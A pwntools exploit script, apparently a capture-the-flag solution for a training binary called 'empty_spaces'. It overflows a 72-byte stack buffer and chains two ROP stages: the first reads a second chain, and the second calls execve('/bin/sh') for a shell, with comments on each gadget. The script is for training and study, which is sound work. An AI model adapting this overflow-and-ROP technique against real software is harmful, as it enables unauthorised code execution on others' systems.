from pwn import *

# Asks for a string and does nothing.
# Before returning from the main, function empty puts 4 "random" bytes every 6 long words (64 bits), completely breaking long exploits => we have to use a rop chain of at most 5 long words to read a new rop chan which will overwrite "random" data
# There is a huge amount of useless gadgets.

CHALL_PATH = "./empty_spaces"
COMMANDS = """
b main
c
"""
context.arch = "amd64"

# sRIP is 72 bytes up

if args.REMOTE :
    c = remote("empty-spaces.training.offensivedefensive.it", 8080, ssl = True)
else :
    if args.GDB :
        c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    else :
        c = process(CHALL_PATH)

XOR_EDI = 0x45642a
POP_RDX = 0X4447d5
SYSCALL = 0X40ba76
MOV_RAX_RSI = 0x42073c + 8
MOV_RDI_RAX = 0x404be6
XOR_EDX = 0x47c11d
MOV_RAX_R8 = 0x4545b0 + 6
SUB_RAX_1 = 0X418e12 + 1
POP_RSI = 0x477d3d

c.recvuntil(b"pwn?")

# preparing the ropchain for reading a new ropchain (getting rid of those random bytes made by function empty)
payload = b'A' * 72         # overflowing the buffer to the srip
payload += p64(XOR_EDI)     # setting edi to 0 (fd for read, 0 is stdin)
payload += p64(POP_RDX)     # setting rdx to 240 (number of bytes to read)
payload += p64(240)         # the 240 to put inside rdx
payload += p64(SYSCALL)     # calling read (rsi with the buffer to write is already set)

c.sendline(payload)

# preparing the ropchain to call execve /bin/sh (overwriting old ropchain)
# this payload will be 240 bytes
payload = b"/bin/sh\0"      # preparing /bin/sh to be executed by execve
payload += b"A" * 96        # 104 bytes to realign the input with the rsp and go on with the rop chain
payload += p64(MOV_RAX_RSI) # moving address of string "/bin/sh\0" from rsi to rax (we need it to rdi for execve)
payload += p64(MOV_RDI_RAX) # moving address of string "/bin/sh\0" from rax to rdi (program to be executed, execve parameter "name")
payload += p64(XOR_EDX)     # setting rdx to 0 (no envpointer for execve)
payload += b'A' * 0x18      # for XOR_EDX gadget incrementing esp by 0x18
payload += p64(0)           # for XOR_EDX gadget making pop of rbx (could be any value, not mandatorily 0)
payload += p64(0)           # for XOR_EDX gadget making pop of rbp (could be any value, not mandatorily 0)
payload += p64(MOV_RAX_R8)  # in r8 there is 0x40, which is near 0x3b (execve code)

for i in range(5) :         # decrementing rax to 0x3b (0x40 - 0x1 * 5 = 0x3b)
    payload += p64(SUB_RAX_1)

payload += p64(POP_RSI)     # setting rsi to 0 (no argv for execve)
payload += p64(0)           # the 0 to put inside rsi
payload += p64(SYSCALL)     # calling execve /bin/sh

input("wait")
c.sendline(payload)

c.interactive()
